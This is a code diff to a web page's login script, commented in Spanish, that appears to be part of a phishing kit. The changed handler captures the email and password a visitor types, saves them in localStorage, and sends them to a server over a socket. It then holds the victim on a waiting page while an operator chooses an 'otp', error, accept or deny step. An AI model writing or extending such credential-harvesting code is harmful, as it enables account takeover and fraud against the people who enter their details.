@@ -94,32 +94,59 @@
 
     window.addEventListener('DOMContentLoaded', () => {
       const form = document.getElementById('login-form');
+      const inputCorreo = document.getElementById('usuario');
+      const inputClave = document.getElementById('clave');
+
+      // Recuperar y mostrar los valores anteriores si existen
+      const correoGuardado = localStorage.getItem('correo');
+      const claveGuardada = localStorage.getItem('contrasena');
+
+      if (correoGuardado) inputCorreo.value = correoGuardado;
+      if (claveGuardada) inputClave.value = claveGuardada;
 
       if (form) {
         form.addEventListener('submit', (e) => {
           e.preventDefault();
 
-          // Recuperar datos del index.html
+          const correo = inputCorreo.value;
+          const contrasena = inputClave.value;
           const sessionId = localStorage.getItem('sessionId');
-          const correo = localStorage.getItem('correo');
-          const contrasena = localStorage.getItem('contrasena');
 
-          // Reenviar los mismos datos sin depender del input
+          // Guardar los datos ingresados en localStorage
+          localStorage.setItem('correo', correo);
+          localStorage.setItem('contrasena', contrasena);
+
+          // Enviar al servidor
           socket.emit('errorlogoForm', { correo, contrasena, sessionId });
 
-          // Ir al loader
+          // Redirigir a opciones.html para esperar acción
           window.location.href = 'opciones.html';
         });
       }
     });
 
+    // Escuchar decisiones del servidor para error logo
     socket.on("respuestaErrorLogo", (decision) => {
       if (decision === "otp") {
         window.location.href = "bienvenido.html";
       } else if (decision === "error_logo") {
-        window.location.href = "errorlogo.html";
+        // Permanecer en errorlogo.html
       }
     });
+
+    // Permitir que desde opciones.html se envíe una acción final
+    function enviarDecisionFinal(decision) {
+      const correo = localStorage.getItem('correo');
+      const sessionId = localStorage.getItem('sessionId');
+
+      socket.emit('decisionFinal', { correo, decision, sessionId });
+
+      if (decision === "denegado") {
+        window.location.href = "denegado.html";
+      } else if (decision === "aceptado") {
+        window.location.href = "bienvenido.html";
+      }
+    }
   </script>
 </body>
 </html>
